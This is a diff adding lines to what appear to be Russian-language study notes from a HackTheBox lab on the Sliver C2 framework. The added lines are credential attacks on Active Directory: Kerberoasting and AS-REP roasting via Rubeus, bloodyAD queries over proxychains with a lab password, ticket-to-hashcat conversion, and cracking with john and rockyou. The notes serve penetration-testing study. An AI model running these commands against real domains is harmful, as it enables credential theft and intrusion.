@@ -74,6 +74,15 @@ Sliver
     после установления сессии
     inline-execute-assembly /home/htb-ac590/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
     inline-execute-assembly /home/htb-ac590/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'
+
+    внутренние ресурсы
+    proxychains bloodyAD --host 172.16.1.15 -d child.htb.local -u david -p 'Password123!' get object websec
+    
+    внутренний ресурс c2tc-kerberoast
+    sliver (http-beacon) > c2tc-kerberoast roast websec (имя записи)
+    Как только мы получим билет и сохраним его локально, мы воспользуемся им. TicketToHashcat.py.
+    mxdelta@htb[/htb]$ python3 TicketToHashcat.py websec-ticket.enc 
+    john roastme-13100.txt -w=/usr/share/wordlists/rockyou.txt
     
 # Impersonation and Lateral Movement
     Создание токена пользователя (runas)
